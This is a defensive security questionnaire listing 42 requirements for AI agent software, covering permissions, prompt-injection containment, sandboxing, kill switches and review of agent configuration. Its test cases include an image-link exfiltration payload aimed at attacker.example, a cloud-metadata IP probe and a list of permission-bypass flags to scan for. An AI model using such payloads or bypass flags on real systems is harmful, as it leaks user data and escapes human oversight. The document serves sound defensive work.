# The ARI-42 questionnaire (final, edition 2026-11)

42 questions in 10 areas. Each one is a yes/no question about the software being built, the
requirement behind it, when it applies, how to build it so the answer is "yes", how to prove it,
and what the research found.

How to read the fields:

- **Question**: what you must be able to answer "yes" to, with evidence.
- **Requirement**: the requirement text as used in the ARI-42 index. Do not weaken it.
- **Applies when**: the signals that make it in scope. If none are present, mark it N/A and say why.
- **Build**: what the code, config or infrastructure must do. Secure by default, not opt-in.
- **Verify**: the test or check that proves it. A requirement without a passing check is not "Met".
- **Gate**: `release` = checkable on every release from code or infra; `partly` = part code, part
  document; `periodic` = an organisational item a human owns (the agent drafts, a person signs).
- **Signal**: what the research found. "AI CVEs" = 2025–26 CVEs in AI or agent software whose most
  direct preventing control is this requirement (7,257 screened). "Risk" = share of the 85 audited
  tools whose default or recent vulnerability works against it.

Code for the patterns named in **Build** is in `secure-patterns.md`.

---

## GOV · Inventory and governance

### GOV-1 · Maintain an AI bill of materials
- **Question.** Is there a current, generated inventory of every model, agent, tool, MCP server, plugin, skill and AI provider in the product and in engineering, with version, owner and the data each can reach?
- **Requirement.** Keep a current inventory (AI-BOM) of every model, agent, tool, MCP server, plugin or skill and AI provider in the product and in engineering, with version, owner and the data each can reach.
- **Applies when.** Always, for any project that uses a model.
- **Build.** Generate the AI-BOM from the repo, not by hand: model IDs, SDK imports, MCP configs, skills, gateways. Pin model IDs to dated versions (no `-latest` aliases in production config). Keep it in `ARI42.md` (section "AI-BOM") or `ai-bom.json`, regenerated in CI.
- **Verify.** `python3 scripts/ari42_scan.py detect --json` output matches the BOM; CI fails when a new AI dependency appears that is not in the BOM.
- **Evidence.** BOM file, CI job, pinned model IDs.
- **Gate.** release. **Signal.** Cited by regulators as the starting point; you cannot patch what you have not listed.

### GOV-2 · AI policy and risk assessment
- **Question.** Is there an approved AI policy, a named owner for AI security, and a written risk and impact assessment for this agent feature before launch?
- **Requirement.** Have an approved AI policy, a named owner for AI security, and a written risk and impact assessment for each agent feature before launch.
- **Applies when.** The product ships an agent or LLM feature to users or customers.
- **Build.** Draft the feature's risk assessment as part of the work: what the agent can reach, the worst action it can take, which ARI-42 controls bound it. Leave the signature to a person.
- **Verify.** Assessment exists for the feature and names an owner.
- **Evidence.** Policy, risk register entry, impact assessment.
- **Gate.** periodic (human). **Signal.** The first thing an auditor samples.

### GOV-3 · Notify customers of AI changes
- **Question.** Will customers be told before a new AI provider or model is added, or before an agent gets new tools or more autonomy?
- **Requirement.** Tell customers before adding a new AI provider or model, or before giving an agent new tools or more autonomy.
- **Applies when.** B2B or regulated product with customers who rely on the agent's scope.
- **Build.** When a change adds a provider, a model family, a tool with side effects or raises autonomy, add an entry to the AI changelog and flag it in the PR description.
- **Verify.** Changelog entry exists for each such change.
- **Evidence.** Contract clause, public AI changelog.
- **Gate.** periodic (human). **Signal.** Sub-processor notices cover new vendors, not an existing agent gaining the power to send email or move money.

### GOV-4 · Define agent autonomy and owner
- **Question.** For each agent, is it written down what it may do on its own, what needs a person, and who is accountable?
- **Requirement.** For each agent, state what it may do on its own, what needs a person, and who is accountable for its actions.
- **Applies when.** Any agent that calls tools.
- **Build.** Keep an agent register (in `ARI42.md`): agent name, tools, autonomy level (suggest / act with approval / act alone), accountable owner. Encode the same levels in code as the approval policy (AUTH-3), so the document and the code cannot drift.
- **Verify.** Every agent defined in code appears in the register; tool list in register equals tool list in code.
- **Evidence.** Agent register.
- **Gate.** periodic. **Signal.** 73% of audited tools help here (most help).

## DATA · Data sent to models

### DATA-1 · Map data reaching models
- **Question.** Is it documented which customer data enters prompts, context windows, embeddings, memory and tool calls, and which provider receives each?
- **Requirement.** List which customer data enters prompts, context windows, embeddings, agent memory and tool calls, and which provider receives each.
- **Applies when.** Any customer, user or confidential data can reach a model, embedding or memory store.
- **Build.** For each feature, record the data-flow: source → transform (redaction) → model/provider/region → stores (logs, memory, vector DB, observability vendor). Keep it next to the code that builds the prompt.
- **Verify.** Each prompt-building function has a matching data-flow entry.
- **Evidence.** AI data-flow map per feature.
- **Gate.** partly.

### DATA-2 · Minimise data sent to models
- **Question.** Is personal and confidential data minimised, masked or tokenised before it reaches a model?
- **Requirement.** Minimise, mask or tokenise personal and confidential data before it reaches a model.
- **Applies when.** Personal or confidential data is in scope of DATA-1.
- **Build.** Put one redaction step in the single path that builds model requests (allowlist the fields the task needs; mask the rest). Never send whole records "for context".
- **Verify.** Unit tests feed records with PII and assert the outgoing request contains none of it.
- **Evidence.** Redaction code and tests; sample of redacted egress.
- **Gate.** release. **Signal.** 16 AI CVEs.

### DATA-3 · No provider training; bounded retention
- **Question.** Is it confirmed in contract and settings that providers do not train on customer data and that retention (including abuse-monitoring logs) is zero or bounded?
- **Requirement.** Confirm in contract and in settings that providers do not train on customer data, and that their retention (including abuse-monitoring logs) is zero or bounded.
- **Applies when.** Customer data reaches a third-party model provider.
- **Build.** Use the enterprise/API endpoints and any zero-retention or store=false option the provider offers; set it in code where it is a request parameter.
- **Verify.** Config shows the setting; provider terms on file.
- **Evidence.** DPAs, zero-retention settings.
- **Gate.** partly (human for contract).

### DATA-4 · Control inference location
- **Question.** Is it stated where inference runs, and restricted to countries the customer approves?
- **Requirement.** State where inference runs, and restrict AI processing to countries the customer approves.
- **Applies when.** Customer data reaches a model and residency matters (regulated, EU, India, enterprise).
- **Build.** Configure regional endpoints explicitly (no global default) and make region a config value, not a hard-coded URL.
- **Verify.** Config test asserts every provider client uses an approved region.
- **Evidence.** Provider region config, transfer register.
- **Gate.** release. **Signal.** 70% of tools help.

### DATA-5 · Isolate and purge agent memory
- **Question.** Are agent memory, vector stores and caches tenant-isolated with server-enforced filters, under retention, covered by deletion, with write provenance so a poisoned source can be purged and rolled back, and free of credentials?
- **Requirement.** Keep agent memory, vector stores and caches tenant-isolated (filters enforced on the server), under retention, and included in deletion requests. Record the source of every memory or index write so a poisoned source can be found, purged everywhere (chunks, embeddings, summaries, caches) and rolled back; never store credentials in memory.
- **Applies when.** The agent has memory, RAG, a vector store, a semantic cache or conversation persistence.
- **Build.** Tenant and user IDs are injected by the server from the authenticated session, never taken from the model or the request body. One namespace/collection per tenant, or a mandatory server-side filter. Every write carries `{tenant, user, source_uri, source_hash, written_by, written_at}`. A purge-by-source job deletes chunks, embeddings, summaries and cache entries. TTLs set. Secret scanner runs before a memory write.
- **Verify.** Cross-tenant test: tenant A writes, tenant B's query with any filter tampering returns nothing. Purge test: delete a source, assert zero derived records remain.
- **Evidence.** Isolation tests, provenance fields, purge runbook, erasure job.
- **Gate.** release. **Signal.** 214 AI CVEs; Risk in 27% of tools; memory layers carry the second-highest Risk share (18%).

## AUTH · Agent identity and permissions

### AUTH-1 · Per-agent identity
- **Question.** Does each agent run under its own identity, never a shared human or admin account, with credentials scoped to its tools and expiring quickly?
- **Requirement.** Run each agent under its own identity, never a shared human or admin account, with credentials scoped to its tools and expiring quickly.
- **Applies when.** The agent calls any API, database or cloud resource.
- **Build.** One service identity per agent; least-privilege role per tool; short-lived tokens (minutes to hours) minted by a broker, not static keys in env. No admin or personal tokens.
- **Verify.** Test that the agent's credential cannot call an API outside its tool list; token TTL asserted in config.
- **Evidence.** Per-agent roles, token lifetimes, non-human identity inventory.
- **Gate.** release. **Signal.** 39 AI CVEs; broad long-lived tokens turned many 2025–26 incidents into breaches.

### AUTH-2 · Never exceed the user's permissions
- **Question.** When the agent acts for a user, can it never do more than that user could, never pass the user's token to third-party tools, never widen scope across agent hops, and check permissions in the retrieval query and again at each action?
- **Requirement.** When an agent acts for a user, make sure it can never do more than that user could, and never pass the user's token on to third-party tools. This holds when an agent delegates to another agent: each hop gets only scopes derived from, and never wider than, its delegator's. Check the user's permissions inside the retrieval query and again when each action runs; a session or conversation ID is never proof of identity.
- **Applies when.** Multi-user or multi-tenant product, RAG over shared data, any agent acting on behalf of a user, multi-agent delegation.
- **Build.** Every tool handler receives the authenticated principal from the server context (never from model arguments) and runs the same authorisation check the normal API runs. Retrieval queries include the user's ACL filter. Sub-agents receive down-scoped tokens. Third-party tools get their own token (on-behalf-of exchange), never the user's raw token. Session/conversation IDs are not credentials.
- **Verify.** Authorisation tests: user without access asks the agent for the record; tool call is refused even if the model passes a different user ID. Delegation test: sub-agent scope ⊆ parent scope.
- **Evidence.** On-behalf-of design, delegation rules, permission-filtered retrieval, tests.
- **Gate.** release. **Signal.** 1,108 AI CVEs (third most common); Risk in 26% of tools; only 31% of tools help.

### AUTH-3 · Approval for consequential actions
- **Question.** Do consequential actions (send, call, pay, delete, deploy, export) require a human approval that shows the real tool-call arguments, is bound to that exact action, enforced outside the model, re-requested if the plan changes, and logged?
- **Requirement.** List the actions that need human approval (sending messages, placing calls, payments, deletes, deploys, exports); build the approval screen from the real tool-call arguments, not the model's summary; bind the approval to that exact action, enforce it outside the model, require a new approval if the plan changes, and log it.
- **Applies when.** Any tool with side effects outside the sandbox.
- **Build.** Classify each tool `read` / `write` / `consequential`. Consequential calls pause; the approval UI renders the actual arguments; the approval token is a hash of `(tool, canonical args, principal, expiry)` and the executor refuses any call whose hash does not match. A missing decision is a reject. The model never sees or produces the approval token.
- **Verify.** Test that changing one argument after approval makes the executor refuse; test that a timeout rejects.
- **Evidence.** Approval matrix, UI fed from arguments, approval event logs.
- **Gate.** partly. **Signal.** 76% of tools help; incidents of agents deleting production data all map here.

### AUTH-4 · Kill switch and hard limits
- **Question.** Can an agent, a tool or a provider be stopped within minutes from outside the agent loop, and are actions and spend capped with limits that halt, not just alert?
- **Requirement.** Be able to stop an agent, a tool or a provider within minutes (kill switch), and cap agent actions and spend. Limits halt execution rather than only alerting, and the kill switch works outside the agent's own loop by revoking its credentials or process.
- **Applies when.** Any agent loop.
- **Build.** Max turns, max tool calls, max tokens/spend, wall-clock timeout per run, enforced by the runner. A feature flag or revocation path per agent, per tool and per provider that the runner checks before each step and that revokes credentials.
- **Verify.** Test: flip the flag mid-run, next step refuses. Test: exceed budget, run halts.
- **Evidence.** Runbook with a dated drill; limit config.
- **Gate.** release. **Signal.** 99% of tools help (turn/spend limits), but a stop the agent can ignore is no stop.

## INJ · Untrusted content and prompt injection

### INJ-1 · Inventory untrusted inputs
- **Question.** Is every untrusted input that reaches a model listed, including tool results, retrieved documents, memory, sub-agent output and outsider-writable business records?
- **Requirement.** List every untrusted input that reaches a model: end-user speech or text, uploads, web pages, emails, API and tool results, third-party MCP servers, agent memory, RAG corpora (with who can write to each), output from sub-agents and peer agents, and business records outsiders can write (forms, tickets, CRM leads, calendar invites).
- **Applies when.** Always, for any agent.
- **Build.** Per agent, a trust-boundary table in `ARI42.md`: input → who can write it → trusted? Treat anything an outsider can influence as untrusted, including your own database fields filled by forms.
- **Verify.** Every tool that returns external content is listed.
- **Evidence.** Trust-boundary diagram per agent.
- **Gate.** periodic. **Signal.** Least supported requirement: only 9% of tools help.

### INJ-2 · Break the lethal trifecta
- **Question.** For each agent, is it known whether it has private data, untrusted content and an exfiltration path at once, and which control breaks that chain?
- **Requirement.** Say whether any agent has private data, untrusted content and a way to send data out all at once, and which control breaks that chain.
- **Applies when.** Any agent with tools.
- **Build.** Per agent, mark the three legs. If all three are present, remove one by design: split the agent, deny egress (INJ-4), require approval for outbound actions (AUTH-3), or drop private-data access once untrusted content enters the context (taint).
- **Verify.** Capability matrix in `ARI42.md` with the breaking control and its test.
- **Evidence.** Per-agent capability matrix.
- **Gate.** partly. **Signal.** Only 32% of tools help; behind most zero-click leaks.

### INJ-3 · Contain injection in code
- **Question.** Is injection damage limited in code: tool output treated as data, fields sanitised before going into prompts, structured outputs used, and no auto-rendered links or images to arbitrary domains?
- **Requirement.** Limit injection damage in code: treat tool output as data, sanitise fields placed into prompts, use structured outputs, and never auto-render links or images to arbitrary domains. Allowlisted render or fetch domains must be ones attackers can't write to or re-register.
- **Applies when.** Any UI that renders model output, any prompt that includes external content.
- **Build.** Wrap untrusted content in clearly delimited data blocks and never concatenate it into instructions. Prefer schema-constrained outputs for anything that drives logic. In chat UIs, render markdown with images and links restricted to an allowlist of domains you control (or strip images), and set a CSP `img-src` that matches.
- **Verify.** Test: model output containing `![x](https://attacker.example/?d=secret)` renders no request to that host.
- **Evidence.** Renderer config, CSP, tests.
- **Gate.** release. **Signal.** 405 AI CVEs; Risk in 23% of tools; six audited chat interfaces load images from any domain by default.

### INJ-4 · Deny-by-default egress
- **Question.** Do agent runtimes, sandboxes, CI runners and AI gateways have deny-by-default network egress, including DNS?
- **Requirement.** Give agent runtimes, CI runners and AI gateways deny-by-default network egress, including DNS.
- **Applies when.** Any agent runtime, code sandbox, MCP server host or gateway you deploy.
- **Build.** Network policy or sandbox config with an explicit allowlist (model provider, required APIs). For fetch tools, an allowlist plus SSRF protection (block private, link-local and metadata IPs after DNS resolution).
- **Verify.** Test from inside the runtime: an arbitrary domain and `169.254.169.254` are unreachable.
- **Evidence.** Network policy; reachability test.
- **Gate.** release. **Signal.** 636 AI CVEs; the control that would have contained the most 2025–26 incidents.

### INJ-5 · No secrets in prompts
- **Question.** Are secrets kept out of system prompts, so a leaked prompt causes no harm?
- **Requirement.** Keep secrets out of system prompts and make sure a leaked prompt causes no harm.
- **Applies when.** Always.
- **Build.** No keys, internal URLs with tokens, passwords or authorisation rules that must stay secret in prompts. Authorisation lives in code (AUTH-2), not prompt text.
- **Verify.** Secret scan over prompt templates (`ari42_scan.py check`).
- **Evidence.** Prompt review, scan result.
- **Gate.** release. **Signal.** Only 34% of tools help.

## OUT · Output and user-facing behaviour

### OUT-1 · Validate model output before sinks
- **Question.** Is model output validated before it reaches SQL, shell, HTML, APIs or another agent, with model-written SQL only through parameterised templates or the user's own database identity?
- **Requirement.** Validate model output before it reaches SQL, shell, HTML, APIs or another agent. Model-written SQL runs only through parameterised templates or under the user's own database identity, never a privileged service account.
- **Applies when.** Model output reaches any interpreter, query, template, file path or downstream API.
- **Build.** Parse into a schema (Pydantic/Zod) and validate; allowlist enums and identifiers; parameterised queries; argv arrays, never `shell=True` with model text; HTML-escape; path canonicalisation inside an allowed root. Text-to-SQL runs as a read-only, row-level-secured role.
- **Verify.** Tests with injection payloads in model output for each sink.
- **Evidence.** Output schemas, encoding, tests, DB role.
- **Gate.** release. **Signal.** 1,131 AI CVEs (second most common).

### OUT-2 · Disclose AI; guard user-facing output
- **Question.** Are end users told they are dealing with AI, and are user-facing agents guarded against harmful, misleading or off-script output?
- **Requirement.** Tell end users they are dealing with AI, and guard user-facing agents (voice, chat) against harmful, misleading or off-script output.
- **Applies when.** End users talk to the agent (chat, voice, email).
- **Build.** Disclosure in the first message or UI; output guardrail on the response path; scope restriction to the product's task.
- **Verify.** Guardrail tests; disclosure present.
- **Evidence.** Disclosure script, guardrail tests.
- **Gate.** partly. **Signal.** EU AI Act Art 50 applies from Aug 2026.

### OUT-3 · People in decisions about people
- **Question.** Where AI output feeds decisions about people, is its accuracy measured and is a person in the loop?
- **Requirement.** Where AI output feeds decisions about people, measure its accuracy and keep a person in the loop.
- **Applies when.** Hiring, credit, insurance, eligibility, moderation, scoring of people.
- **Build.** Model output is a recommendation; a person decides; record both. Accuracy evals per release.
- **Verify.** Eval report; workflow cannot finalise without a human decision.
- **Evidence.** Accuracy evals, review workflow.
- **Gate.** partly. **Signal.** High-risk under the EU AI Act.

### OUT-4 · Sandbox agent-generated code
- **Question.** Does every code, shell or interpreter call the agent generates run in a disposable per-session sandbox: not as root, no host filesystem, no credentials or customer data beyond the task, no network unless allowed, and never `eval()` of model or memory content?
- **Requirement.** Run any code, shell command or interpreter call an agent generates in the product in a disposable per-session sandbox: not as root, no host filesystem, no credentials or customer data beyond the task, no network unless allowed, and no eval() of model or memory content.
- **Applies when.** The agent can run code, shell commands, notebooks, SQL engines with UDFs, templates with expressions, or a "Python/REPL/code interpreter" tool.
- **Build.** Execute in a microVM/gVisor/container sandbox created per session and destroyed after: non-root user, read-only base, scratch workdir, no mounted secrets, empty environment except what the task needs, egress denied (INJ-4), CPU/memory/time limits. Never `eval`, `exec`, `new Function`, `vm.runIn*`, `pickle.loads` or template evaluation on model or memory content in the host process.
- **Verify.** Test inside the sandbox: reading `/etc/hostname` of the host, `~/.ssh`, host env vars and the provider API key all fail; outbound request fails. Code search shows no eval/exec on model output.
- **Evidence.** Sandbox spec, escape test, code search.
- **Gate.** release. **Signal.** #1 preventing requirement: 1,302 AI CVEs (17.9%). Risk in 37 of 70 tools that run code; only 2 meet it by default. The typical cause is a default path that runs generated code in the host process.

## MCP · MCP servers, tools and skills

### MCP-1 · Allowlist and pin servers and skills
- **Question.** Are the MCP servers, plugins, skills and external agents used in production and by engineers allowlisted, pinned to a version or hash, reviewed before upgrade, never discovered from open registries at runtime, and each peer agent authenticated?
- **Requirement.** Allowlist the MCP servers, plugins and skills used in production and by engineers, and the external agents (A2A) the product calls; pin each to a version or content hash; review before upgrading. No discovery from open registries at runtime, and each peer agent is authenticated.
- **Applies when.** Any MCP client config, plugin, skill, or A2A call.
- **Build.** Exact versions in `.mcp.json`/config (`pkg@1.4.2`, `uvx pkg==1.4.2`, image digests); no `@latest`, no unpinned `npx -y`. A checked-in allowlist; dynamic discovery off.
- **Verify.** `ari42_scan.py check` flags unpinned servers; CI fails on unlisted servers.
- **Evidence.** Allowlist, lock/hash file, review records.
- **Gate.** release. **Signal.** 45 AI CVEs; malicious-skill and malicious-MCP-package incidents all exploited unpinned add-ons.

### MCP-2 · Detect tool-description changes
- **Question.** Are tool descriptions and manifests pinned, with an alert when they change?
- **Requirement.** Pin tool descriptions and manifests and alert when they change (rug pulls, tool poisoning).
- **Applies when.** The agent consumes tools from MCP servers or plugins you do not control.
- **Build.** Hash each tool's name, description and input schema at approval time; on connect, compare; on mismatch, disable the tool and alert.
- **Verify.** Test: change a description, client refuses the tool.
- **Evidence.** Manifest hash check.
- **Gate.** release. **Signal.** Only 23% of tools help.

### MCP-3 · Authenticate exposed MCP/agent APIs
- **Question.** Does every MCP server or agent API you expose use OAuth per the current MCP spec, scoped to the tenant, rate-limited and logged?
- **Requirement.** For any MCP server or agent API you expose: OAuth per the current MCP spec, tenant-scoped, rate-limited and logged.
- **Applies when.** You ship an MCP server over HTTP, an A2A endpoint, an agent server, a dev console or any HTTP endpoint that runs an agent.
- **Build.** Authentication on by default, refuse to start without it on non-loopback hosts; bind to `127.0.0.1` for local; validate audience on tokens (no token passthrough); per-tenant scoping; rate limit; Origin check for local HTTP servers (DNS rebinding).
- **Verify.** Unauthenticated request returns 401; token for tenant A cannot reach tenant B.
- **Evidence.** Auth config, endpoint test.
- **Gate.** release. **Signal.** 750 AI CVEs; Risk in 28 of 47 tools (60%): many ship a ready-to-run server with no authentication.

### MCP-4 · Sandbox MCP servers
- **Question.** Are local and remote MCP servers sandboxed (no broad filesystem or network) and never exposed to the internet without authentication?
- **Requirement.** Sandbox local and remote MCP servers (no broad filesystem or network), and never expose one to the internet without authentication.
- **Applies when.** You run or launch MCP servers (stdio or HTTP).
- **Build.** Launch stdio servers with a minimal explicit environment (never the parent's full env), scoped filesystem roots, and a container or OS sandbox for third-party servers.
- **Verify.** Test that the server process cannot read the client's provider key or files outside its root.
- **Evidence.** Sandbox config, external scan.
- **Gate.** release. **Signal.** 286 AI CVEs; Risk in 29% of tools; 6 of 8 official MCP SDKs tested start local servers with the client's full environment.

## GW · Model providers and AI gateways

### GW-1 · Protect provider keys
- **Question.** Are model-provider API keys in a secrets manager, separate per environment, scoped, rotated, and never exposed to the browser or an agent's context or commands?
- **Requirement.** Keep model-provider API keys in a secrets manager, separate per environment, scoped, rotated, and never exposed to the browser or an agent's context.
- **Applies when.** Always, if a provider key exists.
- **Build.** Keys from a secrets manager; never in client bundles (`NEXT_PUBLIC_*`, `VITE_*`); never in prompts; scrub them from the environment of any shell, code tool or subprocess the agent runs.
- **Verify.** Test: the agent's shell tool runs `env`, output has no provider key. Secret scan clean.
- **Evidence.** Key inventory with rotation dates; env-scrub test.
- **Gate.** release. **Signal.** 169 AI CVEs; Risk in 22 of 69 tools: most coding harnesses pass provider keys to the commands the agent runs.

### GW-2 · Agent stack as critical supply chain
- **Question.** Are the LLM gateway, agent framework and inference servers hash-pinned, patched against known-exploited CVEs within days, authenticated on every endpoint, admin never internet-facing, and model artefacts pulled by digest in safe formats?
- **Requirement.** Treat any LLM gateway, agent framework or self-hosted inference server (LiteLLM, LangChain, vLLM, Ollama, Ray, Triton and similar, including staging copies of agent builders) as critical supply chain: hash-pinned, patched against CISA KEV within days, authentication on every endpoint, admin never internet-facing. Pull model weights, adapters, tokenizers and chat templates by digest and load them only in safe formats.
- **Applies when.** Any agent framework, gateway, low-code builder or self-hosted model.
- **Build.** Lockfiles with hashes; container images by digest; `safetensors`, `torch.load(weights_only=True)`, `trust_remote_code=False`; no pickle from untrusted sources; Dependabot/Renovate on the agent stack; inference and builder admin ports private.
- **Verify.** Lockfile present and hashed; scan flags unsafe loaders; external scan shows no admin port.
- **Evidence.** Lockfile hashes, digests, patch tickets.
- **Gate.** release. **Signal.** Most common Risk: 53 of 70 tools (76%) had a relevant 2025–26 CVE or supply-chain incident; 68 of 85 tools had at least one incident.

### GW-3 · Pin models; evaluate before switching
- **Question.** Are model versions pinned, behaviour and security evals re-run before switching models or providers, and is there a fallback when a provider fails?
- **Requirement.** Pin model versions, re-run behaviour and security evals before switching models or providers, and have a fallback when a provider fails.
- **Applies when.** Any model in production.
- **Build.** Dated model IDs in config; a model change is a PR that runs the EVAL-1 suite; a fallback provider or graceful degradation path.
- **Verify.** Config uses pinned IDs; eval run attached to the switch PR.
- **Evidence.** Model registry, eval report, failover test.
- **Gate.** partly. **Signal.** 88% of tools help.

## LOG · Logging and AI incidents

### LOG-1 · Log every agent run
- **Question.** Is every agent run logged (model and version, prompt version, tools called with arguments, approvals, outputs), with PII redacted, retained and tamper-evident, and with full bodies off by default, including in third-party observability tools?
- **Requirement.** Log every agent run: model and version, prompt version, tools called with arguments, approvals and outputs, with PII redacted, retained and tamper-evident. Full prompt, response and tool bodies are not logged by default, and redaction applies equally to third-party LLM observability tools.
- **Applies when.** Always.
- **Build.** One structured event per step (OpenTelemetry GenAI conventions work well): run ID, agent, model ID, prompt version, tool name, argument digest or redacted arguments, approval ID, outcome. Append-only store. Body capture opt-in and redacted.
- **Verify.** Sample trace contains every field; PII test on logs; observability exporter uses the same redactor.
- **Evidence.** Sample trace, retention and integrity config.
- **Gate.** release. **Signal.** 88% of tools help; the trail is itself a data store and has leaked.

### LOG-2 · Detect abnormal agent behaviour
- **Question.** Are there alerts on abnormal agent behaviour: unusual tool use, spikes, exfiltration patterns, injection attempts?
- **Requirement.** Alert on abnormal agent behaviour: unusual tool use, spikes, exfiltration patterns, injection attempts.
- **Applies when.** Agents in production.
- **Build.** Emit metrics per tool and per agent; alert on new tools, rate spikes, denied egress, approval rejections, budget halts.
- **Verify.** Alert rules exist and fire in a test.
- **Evidence.** Detection rules, alert history.
- **Gate.** release. **Signal.** The most common shortfall of sandboxes.

### LOG-3 · Plan for AI incidents
- **Question.** Does the incident plan cover AI incidents, with customer-notification timelines that apply to them?
- **Requirement.** Cover AI incidents in the incident plan (injection exploited, data leaked through a model, harmful agent action, AI provider breach), with customer notification SLAs that apply to them.
- **Applies when.** Product in production.
- **Build.** Draft the playbook entries the feature needs (how to kill-switch it, where its logs are).
- **Gate.** periodic (human).

### LOG-4 · Customer access to agent records
- **Question.** Can a customer get the full record of what agents did in its tenant within an agreed number of days?
- **Requirement.** Give a customer the full record of what agents did in its tenant within an agreed number of days.
- **Applies when.** B2B, multi-tenant.
- **Build.** LOG-1 events carry tenant ID; an export endpoint or job per tenant.
- **Verify.** Export test returns only that tenant's events.
- **Gate.** partly.

## EVAL · Testing and red-teaming

### EVAL-1 · Gate releases on security evals
- **Question.** Before each release of an agent feature, do security evals (prompt injection, data leakage, tool misuse, jailbreak) run with pass thresholds that block the release?
- **Requirement.** Before each release of an agent feature, run security evals (prompt injection, data leakage, tool misuse, jailbreak) with pass thresholds that block the release.
- **Applies when.** Any agent feature.
- **Build.** A test suite in CI: indirect injection through each untrusted input from INJ-1, attempts to call consequential tools without approval, cross-tenant retrieval, exfiltration via links/images/egress. Threshold fails the build. Test the deterministic controls, not only the model's refusal.
- **Verify.** CI job exists and is required.
- **Evidence.** Eval suite, CI results.
- **Gate.** release.

### EVAL-2 · Independent adversarial testing
- **Question.** Does an independent tester red-team the AI features, agents and endpoints at least yearly, using adaptive attacks against the deployed system with real tools?
- **Requirement.** Have an independent tester red-team the AI features, agents and MCP or API endpoints at least yearly, using adaptive attacks against the deployed system with real tools.
- **Gate.** periodic (human). **Signal.** Adaptive attacks broke 12 published defences; static attack sets overstate robustness.

### EVAL-3 · Version prompts and config as code
- **Question.** Are prompts, agent configs and tool lists versioned, reviewed and able to be rolled back, the same as code?
- **Requirement.** Version, review and be able to roll back prompts, agent configs and tool lists, the same as code.
- **Applies when.** Always.
- **Build.** Prompts in the repo (not only in a dashboard), with a version ID logged per run (LOG-1).
- **Verify.** Prompt version appears in traces; git history shows review.
- **Gate.** release.

## SDLC · Coding agents in engineering

### SDLC-1 · Approve coding assistants
- **Question.** Are the AI coding assistants engineers may use named, under enterprise terms, with the rest blocked?
- **Requirement.** Name the AI coding assistants engineers may use, under enterprise terms (no training, bounded retention), and block the rest.
- **Gate.** periodic (human).

### SDLC-2 · Sandbox coding agents
- **Question.** Do coding agents run in a sandbox with no production credentials or customer data, an egress allowlist, and auto-approve/"yolo" modes banned by managed policy?
- **Requirement.** Run coding agents in a sandbox with no production credentials or customer data, an egress allowlist, and auto-approve or "yolo" modes banned by managed policy.
- **Applies when.** The team uses coding agents, or the product runs coding agents (then OUT-4 also applies).
- **Build.** Devcontainer or VM for agent work; no prod credentials in that environment; managed settings that deny bypass modes. Never add `--dangerously-skip-permissions`, `bypassPermissions`, `--yolo` or equivalent to scripts.
- **Verify.** Scan for bypass flags; managed settings export.
- **Gate.** partly.

### SDLC-3 · Review AI-written code
- **Question.** Does AI-written code get the same human review, static analysis, secret scan and dependency checks as any code, with no agent able to merge or deploy alone?
- **Requirement.** Give AI-written code the same human review, static analysis, secret scan and dependency checks as any code; an agent can never merge or deploy alone.
- **Build.** Branch protection and required checks; agent tokens lack merge and deploy rights.
- **Gate.** release. **Signal.** 214 AI CVEs.

### SDLC-4 · Protect agent configuration
- **Question.** Is agent config in the repo (hooks, `.mcp.json`, `AGENTS.md`, rules, skills) treated as code: owner-reviewed, not writable by the agent, not loaded before the workspace is trusted, and are runtime approval settings, allowlists and sandbox limits unchangeable by the agent or its skills?
- **Requirement.** Treat agent config in the repo (hooks, .mcp.json, AGENTS.md, rules files, skills) as code: owner review, not writable by the agent, not loaded before the workspace is trusted. The same holds for running agents in the product: approval settings, tool allowlists and sandbox limits can't be changed by the agent or by a skill it runs.
- **Applies when.** Always (this repo has agent config); and any product agent with policy settings.
- **Build.** CODEOWNERS entries for agent config paths. In product agents, policy lives outside anything the agent can write; no tool can modify its own allowlist or approval mode.
- **Verify.** CODEOWNERS covers the paths; test that no tool writes policy files.
- **Gate.** release. **Signal.** 129 AI CVEs; only 19% of tools help.

### SDLC-5 · Isolate CI agents
- **Question.** Are AI agents in CI kept away from untrusted issue or PR text in privileged jobs, with read-only tokens and maintainer-only triggers?
- **Requirement.** Keep AI agents in CI (PR reviewers, issue bots) away from untrusted issue or PR text in privileged jobs, with read-only tokens and maintainer-only triggers.
- **Applies when.** A workflow runs an AI action or agent CLI.
- **Build.** `permissions: contents: read` by default; no `pull_request_target`/`issue_comment` triggers running agents with secrets unless gated on author association; no secrets in jobs that read untrusted text.
- **Verify.** `ari42_scan.py check` on `.github/workflows`.
- **Gate.** release. **Signal.** CI agents at major labs were hijacked from a public issue in 2025–26.

### SDLC-6 · Block hallucinated packages
- **Question.** Are hallucinated or brand-new packages blocked with lockfiles, a registry proxy and a minimum package age?
- **Requirement.** Block hallucinated or brand-new packages (slopsquatting) with lockfiles, a registry proxy and a minimum package age.
- **Build.** Lockfiles committed; before adding any dependency an agent suggests, confirm it exists, is the intended project, and is not days old; package-manager minimum-release-age where supported.
- **Verify.** Lockfile present for each manifest.
- **Gate.** release. **Signal.** About a fifth of AI-suggested packages did not exist in one study.
